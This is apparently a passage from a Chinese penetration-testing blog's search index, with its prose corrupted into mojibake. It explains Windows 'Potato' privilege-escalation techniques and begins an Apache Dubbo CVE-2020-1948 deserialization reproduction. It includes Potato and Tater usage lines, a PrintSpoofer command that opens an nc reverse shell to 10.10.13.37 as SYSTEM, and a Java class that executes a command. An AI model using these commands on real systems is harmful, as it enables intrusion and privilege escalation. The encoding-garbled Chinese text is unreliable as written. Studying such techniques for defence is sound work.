æ¬ºéª—ï¼›ARPæ¬ºéª—æ˜¯ MAC å±‚çš„æ¬ºéª—æ–¹å¼ NBNS åŒ…æœ‰ 1 ä¸ª 2 å­—èŠ‚çš„ TXID å­—æ®µï¼Œå¿…é¡»è¿›è¡Œè¯·æ±‚\\å“åº”çš„åŒ¹é…ã€‚å› ä¸ºæ˜¯ææƒæ¼æ´ï¼Œæ‰€ä»¥æ”»å‡»ä¹‹å‰æ²¡æœ‰æƒé™å¯ä»¥ç›‘å¬æµé‡ã€‚å¯ä»¥é€šè¿‡ 1-65535 ä¹‹é—´è¿›è¡Œæ³›æ´ªçŒœæµ‹ã€‚ å¦‚æœç½‘ç»œä¸­æœ‰ DNS è®°å½•ï¼Œæ­¤æ—¶å°±ä¸ä¼šç”¨åˆ° NBNS åè®®ï¼›å¯ä»¥é€šè¿‡ UDP ç«¯å£è€—å°½çš„æ”»å‡»æŠ€æœ¯ï¼Œè®©æ‰€æœ‰ DNS æŸ¥è¯¢å¤±è´¥ï¼Œä»è€Œå¿…é¡»ä½¿ç”¨ NBNS åè®® ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"2.3 WPAD ä»£ç† Windows ç³»ç»Ÿé‡Œï¼ŒIE æµè§ˆå™¨ä¼šè‡ªåŠ¨æ£€æµ‹ IE ä»£ç†é…ç½®ä¿¡æ¯ï¼Œæ–¹å¼æ˜¯è®¿é—®ï¼Œhttp://wpad/wpad.dat\u0026#8221 WPAD æ˜¯ä¸ä¸€å®šå­˜åœ¨äºç½‘ç»œä¸­ï¼Œå› ä¸ºå³ä½¿æœ‰ DNS æœåŠ¡å™¨ï¼Œä¹Ÿæ²¡æœ‰å¿…è¦è§£æ WPADï¼Œé™¤éç½‘ç»œæƒ³é€šè¿‡é…ç½®è„šæœ¬è‡ªåŠ¨é…ç½®ç½‘ç»œä¸­çš„ä»£ç†ä¿¡æ¯ï¼Œè¿™ç§æƒ…å†µå¾ˆæ–¹ä¾¿ã€‚ å› æ­¤åœ¨ hostsã€DNS æŸ¥è¯¢éƒ½ä¸èƒ½è·å– WPAD çš„æƒ…å†µä¸‹ï¼Œç³»ç»Ÿå¿…ç„¶ä½¿ç”¨ NBNS è¿›è¡Œåå­—æŸ¥è¯¢ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡ NBNS æ¬ºéª—ï¼Œå‘ŠçŸ¥è‡ªå·±å°±æ˜¯ WPAD å¯ä»¥æ„é€  HTTP æœåŠ¡å™¨ï¼Œå“åº” HTTP http://wpad/wpad.dat\u0026#8221 æŸ¥è¯¢ é€šè¿‡åœ¨ 127.0.0.1 ä¸Šæ„å»º HTTPï¼Œå°†æŸ¥è¯¢ WPAD çš„æµé‡å…¨éƒ¨å¼•å¯¼è‡³æœ¬åœ° 127.0.0.1ï¼›å³ä½¿ä½æƒé™ç”¨æˆ·å‘å‡ºçš„å¯¹ WPAD çš„ NBNS æ¬ºéª—ï¼Œé«˜æƒé™è¿›ç¨‹ä¹Ÿä¼šå—å½±å“ï¼Œè®¤ä¸º WPAD å°±æ˜¯æ¬ºéª—åçš„ç»“æœã€‚åŒ…æ‹¬æœ¬åœ°ç®¡ç†å‘˜è¿›ç¨‹å’Œ SYSTEM è¿›ç¨‹ã€‚ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"2.4 HTTP -\u003e SMB NTLM Relay NTLM è®¤è¯å¯¹äºä¸­é—´äººæ”»å‡»çš„é˜²å¾¡èƒ½åŠ›ä¸å¼ºï¼Œæ­¤å‰é’ˆå¯¹ NTLM çš„é‡æ”¾æ”»å‡»èšç„¦äº SMB -\u003e SMB åè®®ï¼Œåå°„æ”»å‡»è®¿é—®è€…çš„ä¸»æœºï¼Œè·å–è¿œç¨‹æ‰§è¡Œæƒé™; å¾®è½¯é€šè¿‡è¡¥ä¸å°å µäº† SMB -\u003e SMB åè®®çš„é‡æ”¾åå°„æ”»å‡»ï¼Œä½†æ˜¯ HTTP -\u003e SMB è¿™ç§è·¨åè®®çš„æ”»å‡»ä»ç„¶æœ‰æ•ˆ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:4","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"2.5 æ”»å‡»æµç¨‹ Hot Potato æ”»å‡»å°±æ˜¯ç»“åˆäº†è¿™å‡ ç‚¹ï¼Œå®ç°æƒé™æå‡ï¼š NBNS æ¬ºéª— æ„é€ æœ¬åœ° HTTPï¼Œå“åº” WPAD HTTP -\u003e SMB NTLM Relay ç­‰å¾…é«˜æƒé™è¿›ç¨‹çš„è®¿é—®ï¼Œå³æ¿€æ´»æ›´æ–°æœåŠ¡(ä½æƒé™å¯æ¿€æ´») https://github.com/Kevin-Robertson/Tater Import-Module .\\Tater.ps1 Invoke-Tater -Command \"command to execute\" å·¥å…·åœ°å€ï¼šhttps://github.com/foxglovesec/Potato Win7 åˆ©ç”¨ - Windows Defender æ›´æ–°æœºåˆ¶ Potato.exe -ip -cmd [cmd to run] -disable_exhaust true Win Server 2008 åˆ©ç”¨ - Windows Update æœºåˆ¶ Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true -spoof_host WPAD.EMC.LOCAL Win Server 2012 R2 - è‡ªåŠ¨æ›´æ–°æœºåˆ¶ï¼Œè¯¥æœºä¼šæ¯å¤©ä¸‹è½½è¯ä¹¦ä¿¡ä»»åˆ—è¡¨(CTL) Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true é˜²æŠ¤ï¼š SMB ç­¾å ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:5","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"3 Rotten Potato \u0026 JuicyPotato ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:3:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"3.1 åŸç† è¿™ä¸¤ç§ä¸åŒäºåˆå§‹çš„ Potatoï¼Œå®ƒæ˜¯é€šè¿‡ DCOM CALL æ¥ä½¿æœåŠ¡å‘æ”»å‡»è€…ç›‘å¬çš„ç«¯å£å‘èµ·è¿æ¥å¹¶è¿›è¡Œ NTLM è®¤è¯ Rotten Potato å’Œ Juicy Potato å‡ ä¹æ˜¯åŒæ ·çš„åŸç†ï¼Œåè€…åœ¨å‰è€…çš„åŸºç¡€ä¸Šå®Œå–„ã€‚ éœ€è¦ç†è§£çš„å‡ ä¸ªçŸ¥è¯†ï¼š ä½¿ç”¨ DCOM æ—¶ï¼Œå¦‚æœä»¥æœåŠ¡çš„æ–¹å¼è¿œç¨‹è¿æ¥ï¼Œé‚£ä¹ˆæƒé™ä¸º Systemï¼Œä¾‹å¦‚ BITS æœåŠ¡ ä½¿ç”¨ DCOM å¯ä»¥é€šè¿‡ TCP è¿æ¥åˆ°æœ¬æœºçš„ä¸€ä¸ªç«¯å£ï¼Œå‘èµ· NTLM è®¤è¯ï¼Œè¯¥è®¤è¯å¯ä»¥è¢«é‡æ”¾ LocalService ç”¨æˆ·é»˜è®¤å…·æœ‰ SeImpersonate å’Œ SeAssignPrimaryToken æƒé™ å¼€å¯ SeImpersonate æƒé™åï¼Œèƒ½å¤Ÿåœ¨è°ƒç”¨ CreateProcessWithToken æ—¶ï¼Œä¼ å…¥æ–°çš„ Token åˆ›å»ºæ–°çš„è¿›ç¨‹ å¼€å¯ SeAssignPrimaryToken æƒé™åï¼Œèƒ½å¤Ÿåœ¨è°ƒç”¨ CreateProcessAsUser æ—¶ï¼Œä¼ å…¥æ–°çš„ Token åˆ›å»ºæ–°çš„è¿›ç¨‹ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:3:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"3.2 å®ç°æµç¨‹ åŠ è½½ COMï¼Œå‘å‡ºè¯·æ±‚ï¼Œæƒé™ä¸º System åœ¨æŒ‡å®š ip å’Œç«¯å£çš„ä½ç½®å°è¯•åŠ è½½ä¸€ä¸ª COM å¯¹è±¡ RottenPotatoNG ä½¿ç”¨çš„ COM å¯¹è±¡ä¸º BITSï¼ŒCLSID ä¸º {4991d34b-80a1-4291-83b6-3328366b9097} å¯ä¾›é€‰æ‹©çš„ COM å¯¹è±¡ä¸å”¯ä¸€ï¼ŒJuicy Potato æä¾›äº†å¤šä¸ªï¼Œè¯¦ç»†åˆ—è¡¨å¯å‚è€ƒå¦‚ä¸‹åœ°å€ï¼š https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md å›åº”æ­¥éª¤ 1 çš„è¯·æ±‚ï¼Œå‘èµ· NTLM è®¤è¯ æ­£å¸¸æƒ…å†µä¸‹ï¼Œç”±äºæƒé™ä¸è¶³ï¼Œå½“å‰æƒé™ä¸æ˜¯ Systemï¼Œæ— æ³•è®¤è¯æˆåŠŸ é’ˆå¯¹æœ¬åœ°ç«¯å£ï¼ŒåŒæ ·å‘èµ· NTLM è®¤è¯ï¼Œæƒé™ä¸ºå½“å‰ç”¨æˆ· ç”±äºæƒé™ä¸ºå½“å‰ç”¨æˆ·ï¼Œæ‰€ä»¥ NTLM è®¤è¯èƒ½å¤ŸæˆåŠŸå®Œæˆ ä¿¡æ¯ RottenPotatoNG ä½¿ç”¨çš„ 135 ç«¯å£ Juicy Potato æ”¯æŒæŒ‡å®šä»»æ„æœ¬åœ°ç«¯å£ï¼Œä½†æ˜¯ RPC ä¸€èˆ¬é»˜è®¤ä¸º135ç«¯å£ï¼Œå¾ˆå°‘è¢«ä¿®æ”¹ åˆ†åˆ«æ‹¦æˆªä¸¤ä¸ª NTLM è®¤è¯çš„æ•°æ®åŒ…ï¼Œæ›¿æ¢æ•°æ®ï¼Œé€šè¿‡ NTLM é‡æ”¾ä½¿å¾—æ­¥éª¤ 1(æƒé™ä¸º System)çš„ NTLM è®¤è¯é€šè¿‡ï¼Œè·å¾— System æƒé™çš„ Token é‡æ”¾æ—¶éœ€è¦æ³¨æ„ NTLM è®¤è¯çš„ NTLM Server Challenge ä¸åŒï¼Œéœ€è¦ä¿®æ­£ åˆ©ç”¨ System æƒé™çš„ Token åˆ›å»ºæ–°è¿›ç¨‹ å¦‚æœå¼€å¯ SeImpersonate æƒé™ï¼Œè°ƒç”¨ CreateProcessWithTokenï¼Œä¼ å…¥ System æƒé™çš„ Tokenï¼Œåˆ›å»ºçš„è¿›ç¨‹ä¸º System æƒé™ æˆ–è€… å¦‚æœå¼€å¯ SeAssignPrimaryToken æƒé™ï¼Œè°ƒç”¨ CreateProcessAsUserï¼Œä¼ å…¥ System æƒé™çš„ Tokenï¼Œåˆ›å»ºçš„è¿›ç¨‹ä¸º System æƒé™ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:3:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"3.2 å®æˆ˜ å·¥å…·åœ°å€ï¼šhttps://github.com/ohpe/juicy-potato 3.2.1 initial access ä¸€ä¸ª iis apppool\\defaultapppool æƒé™çš„ webshellã€‚ 3.2.2 æ ¹æ®æ“ä½œç³»ç»Ÿé€‰æ‹©å¯ç”¨çš„ CLSID å‚è€ƒåˆ—è¡¨ https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md ä¾‹å¦‚æµ‹è¯•ç³»ç»Ÿ Server2012ï¼Œé€‰æ‹© CLSID ä¸º{8BC3F05E-D86B-11D0-A075-00C04FB68820} ä½¿ç”¨æ‰¹å¤„ç†è°ƒç”¨ juicypotato.exe é€ä¸ªéªŒè¯ï¼š åœ°å€å¦‚ä¸‹ï¼š https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat bat è„šæœ¬ä¸éœ€è¦åšä¿®æ”¹ 3.2.3 ææƒ ä¸Šä¼  CS çš„é©¬ï¼Œæˆ–è€…åå¼¹ä¸€ä¸ªäº¤äº’å¼çš„ shell å›æ¥ï¼š åˆ©ç”¨ JuicePotato æ‰§è¡Œå‘½ä»¤æˆ– C2 ç¨‹åº ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:3:3","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"4 PrintSpoofer (PipePotato or BadPotato) ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:4:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"4.1 åŸç† é€šè¿‡ Windows named pipe çš„ä¸€ä¸ª API: ImpersonateNamedPipeClientæ¥æ¨¡æ‹Ÿé«˜æƒé™å®¢æˆ·ç«¯çš„ tokenï¼ˆè¿˜æœ‰ç±»ä¼¼çš„ImpersonatedLoggedOnUserï¼ŒRpcImpersonateClientå‡½æ•°ï¼‰ï¼Œè°ƒç”¨è¯¥å‡½æ•°åä¼šæ›´æ”¹å½“å‰çº¿ç¨‹çš„å®‰å…¨ä¸Šä¸‹æ–‡ï¼Œå®ƒåˆ©ç”¨äº†æ‰“å°æœºç»„ä»¶è·¯å¾„æ£€æŸ¥çš„ BUGï¼Œä½¿ SYSTEM æƒé™æœåŠ¡èƒ½è¿æ¥åˆ°æ”»å‡»è€…åˆ›å»ºçš„ named pipeã€‚ spoolsv.exe æœåŠ¡æœ‰ä¸€ä¸ªå…¬å¼€çš„ RPC æœåŠ¡ï¼Œé‡Œé¢æœ‰ä»¥ä¸‹å‡½æ•°ï¼š DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( /* [in] */ PRINTER_HANDLE hPrinter, /* [in] */ DWORD fdwFlags, /* [in] */ DWORD fdwOptions, /* [unique][string][in] */ wchar_t *pszLocalMachine, /* [in] */ DWORD dwPrinterLocal, /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions) pszLocalMachine å‚æ•°éœ€è¦ä¼ é€’ UNC è·¯å¾„ï¼Œä¼ é€’ \\\\127.0.0.1 æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè®¿é—® \\\\127.0.0.1\\pipe\\spoolssï¼Œä½†è¿™ä¸ªç®¡é“å·²ç»è¢«ç³»ç»Ÿæ³¨å†Œäº†ï¼Œå¦‚æœæˆ‘ä»¬ä¼ é€’ \\\\127.0.0.1\\pipe åˆ™å› ä¸ºè·¯å¾„æ£€æŸ¥è€ŒæŠ¥é”™ ä½†å½“ä¼ é€’ \\\\127.0.0.1/pipe/foo æ—¶ï¼Œæ ¡éªŒè·¯å¾„æ—¶ä¼šè®¤ä¸º 127.0.0.1/pipe/foo æ˜¯ä¸»æœºåï¼Œéšååœ¨è¿æ¥ named pipe æ—¶ä¼šå¯¹å‚æ•°åšæ ‡å‡†åŒ–ï¼Œå°† / è½¬åŒ–ä¸º \\ï¼Œäºæ˜¯å°±ä¼šè¿æ¥ \\\\127.0.0.1\\pipe\\foo\\pipe\\spoolssï¼Œæ”»å‡»è€…å°±å¯ä»¥æ³¨å†Œè¿™ä¸ª named pipe ä»è€Œçªƒå– client çš„ tokenã€‚è¿™ä¸ª POC å¯åŠ¨æ–°è¿›ç¨‹æ˜¯ä½¿ç”¨ CreateProcessAsUser è€Œä¸æ˜¯ CreateProcessWithTokenã€‚ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:4:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"4.2 å®æˆ˜ å·¥å…·åœ°å€ï¼šhttps://github.com/itm4n/PrintSpoofer 4.2.1 æ´¾ç”Ÿä¸€ä¸ª SYSTEM äº¤äº’å¼ shell é€‚ç”¨äºå½“å‰ä¸ºäº¤äº’å¼ shell çš„çŠ¶æ€ä¸‹ï¼š C:\\TOOLS\u003ePrintSpoofer.exe -i -c cmd [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK Microsoft Windows [Version 10.0.19613.1000] (c) 2020 Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u003ewhoami nt authority\\system 4.2.2 æ´¾ç”Ÿä¸€ä¸ª SYSTEM çš„è¿›ç¨‹ é€‚ç”¨äºæ— äº¤äº’å¼ shellï¼Œä½†æ˜¯å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œä½¿ç”¨ CS ä¸Šé©¬æˆ–è€… nc åå¼¹é«˜æƒé™ shellï¼š C:\\TOOLS\u003ePrintSpoofer.exe -c \"C:\\TOOLS\\nc.exe 10.10.13.37 1337 -e cmd\" [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK 4.2.3 æ¡Œé¢ç¯å¢ƒä¸‹æ´¾ç”Ÿ SYSTEM è¿›ç¨‹ åœ¨æœ¬åœ°ç™»å½•æˆ–è€… RDP ä¸‹ï¼Œå…ˆç”¨ qwinsta æŸ¥çœ‹å½“å‰ ID å·ï¼Œç„¶ååˆ©ç”¨ POCï¼š C:\\TOOLS\u003ePrintSpoofer.exe -d 3 -c \"powershell -ep bypass\" [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:4:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"5 RoguePotato ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:5:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"5.1 åŸç† è¿™ä¸ªä¹Ÿæ˜¯åˆ©ç”¨äº†å‘½åç®¡é“ å¾®è½¯ä¿®è¡¥åï¼Œé«˜ç‰ˆæœ¬ Windows DCOM è§£æå™¨ä¸å…è®¸ OBJREF ä¸­çš„ DUALSTRINGARRAY å­—æ®µæŒ‡å®šç«¯å£å·ã€‚ä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶å¹¶èƒ½åšæœ¬åœ°ä»¤ç‰Œåå•†ï¼Œä½œè€…åœ¨ä¸€å°è¿œç¨‹ä¸»æœºä¸Šçš„ 135 ç«¯å£åšæµé‡è½¬å‘ï¼Œå°†å…¶è½¬å›å—å®³è€…æœ¬æœºç«¯å£ï¼Œå¹¶å†™äº†ä¸€ä¸ªæ¶æ„ RPC OXID è§£æå™¨ã€‚ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:5:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"5.2 å®æˆ˜ å·¥å…·åœ°å€ï¼šhttps://github.com/antonioCoco/RoguePotato Mandatory args: -r remote_ip: ip of the remote machine to use as redirector -e commandline: commandline of the program to launch Optional args: -l listening_port: This will run the RogueOxidResolver locally on the specified port -c {clsid}: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) -p pipename_placeholder: placeholder to be used in the pipe name creation (default: RoguePotato) -z : this flag will randomize the pipename_placeholder (don't use with -p) ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:5:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"6 SweetPotato ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:6:0","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"6.1 åŸç† COM/WinRM/Spoolsv çš„é›†åˆç‰ˆï¼Œä¹Ÿå°±æ˜¯ Juicy/PrintSpoofer çš„é›†åˆç‰ˆ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:6:1","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•","ææƒ"],"content":"6.2 å®æˆ˜ å·¥å…·åœ°å€ï¼šhttps://github.com/CCob/SweetPotato å‚è€ƒï¼š https://foxglovesecurity.com/2016/01/16/hot-potato/ https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ https://xz.aliyun.com/t/7776/#toc-4 https://3gstudent.github.io/3gstudent.github.io/Windowsæœ¬åœ°ææƒå·¥å…·Juicy-Potatoæµ‹è¯•åˆ†æ/ https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/ https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/ ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:6:2","tags":["æ¸—é€æµ‹è¯•","ææƒ"],"title":"Potato å®¶æ—ææƒåˆ†æ","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Dubbo Providerååºåˆ—åŒ–æ¼æ´åŸç†åŠå¤ç°","date":"2020-07-01","objectID":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/","tags":["Dubbo","æ¼æ´å¤ç°"],"title":"Apache Dubbo Providerååºåˆ—åŒ–æ¼æ´(CVE-2020-1948)","uri":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Dubbo Providerååºåˆ—åŒ–æ¼æ´(CVE-2020-1948) Apache Dubbo Provider å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ RPC è¯·æ±‚å‘é€æ— æ³•è¯†åˆ«çš„æœåŠ¡åç§°æˆ–æ–¹æ³•åç§°ä»¥åŠä¸€äº›æ¶æ„å‚æ•°æœ‰æ•ˆè½½è·ï¼Œå½“æ¶æ„å‚æ•°è¢«ååºåˆ—åŒ–æ—¶ï¼Œå¯ä»¥é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ","date":"2020-07-01","objectID":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/:0:0","tags":["Dubbo","æ¼æ´å¤ç°"],"title":"Apache Dubbo Providerååºåˆ—åŒ–æ¼æ´(CVE-2020-1948)","uri":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/"},{"categories":["æ¼æ´å¤ç°"],"content":"å½±å“ç‰ˆæœ¬ Dubbo 2.7.0 - 2.7.6 Dubbo 2.6.0 - 2.6.7 Dubbo 2.5.x ï¼ˆå®˜æ–¹ä¸å†ç»´æŠ¤ï¼‰ ","date":"2020-07-01","objectID":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/:1:0","tags":["Dubbo","æ¼æ´å¤ç°"],"title":"Apache Dubbo Providerååºåˆ—åŒ–æ¼æ´(CVE-2020-1948)","uri":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º å¤ç°ç¯å¢ƒï¼š MAC Dubbo 2.5.9 JDK 8U20 ç¯å¢ƒä¸‹è½½åœ°å€ï¼š https://gist.github.com/OneSourceCat/01277dceba635eefbc010af36d3704d7 å°†ä¸‹è½½çš„ç¯å¢ƒå¯¼å…¥åˆ° IDEA ä¸­ï¼š mac ä¸‹å®‰è£… zookeeperï¼š brew install zookeeper brew services start zookeeper ä¿®æ”¹ Provider.java æ–‡ä»¶ï¼ŒæŒ‡å®š Spring åŠ è½½é…ç½®æ–‡ä»¶çš„æ–¹å¼ï¼š ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"file:/Volumes/MacOS/WorkSpace/JAVA/dubbo-poc/DubboModules/src/resources/provider.xml\") ; ä¿®æ”¹ Consumer.java æ–‡ä»¶ï¼ŒæŒ‡å®š Spring åŠ è½½é…ç½®æ–‡ä»¶çš„æ–¹å¼ï¼š ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"file:/Volumes/MacOS/WorkSpace/JAVA/dubbo-poc/dubboconsumer/resources/consumer.xml\") ; è¿è¡Œ Provider.javaï¼š ç¼–è¯‘ ExportObject.java public class ExportObject { public ExportObject() throws Exception { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (java.io.IOException e) { e.printStackTrace(); } } public static void main(String[] args) throws Exception { ExportObject e = new ExportObject(); } } javac ExportObject.java æ³¨æ„ï¼šæ­¤å¤„è¦ç”¨ç›¸åŒç‰ˆæœ¬æˆ–ä½ç‰ˆæœ¬çš„ JDK 